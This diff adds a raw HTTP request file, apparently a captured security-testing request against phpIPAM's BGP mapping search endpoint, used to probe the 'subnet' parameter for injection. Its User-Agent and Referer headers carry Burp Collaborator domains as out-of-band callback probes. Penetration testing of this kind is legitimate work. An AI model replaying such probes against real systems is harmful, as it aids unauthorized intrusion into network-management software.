@@ -1,0 +1,15 @@
+POST /app/admin/routing/edit-bgp-mapping-search.php HTTP/1.1
+Host: 10.10.131.196
+Content-Length: 56
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@ceung106hm8iikwkaokrgloxzo5fy3n.burpcollaborator.net
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://10.10.131.196
+Referer: http://p7x09etjaz1vbxpx31d49yhas1y5mu.burpcollaborator.net/ref
+Accept-Encoding: gzip, deflate
+Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: table-page-size=50; search_parameters=%7B%22addresses%22%3A%22on%22%2C%22subnets%22%3A%22on%22%2C%22vlans%22%3A%22on%22%2C%22vrf%22%3A%22off%22%2C%22pstn%22%3A%22off%22%2C%22circuits%22%3A%22on%22%2C%22customers%22%3A%22off%22%7D; phpipam=n7l23s9km1490ink38hlu60jlq
+Connection: close
+
+subnet=as&bgp_id=2
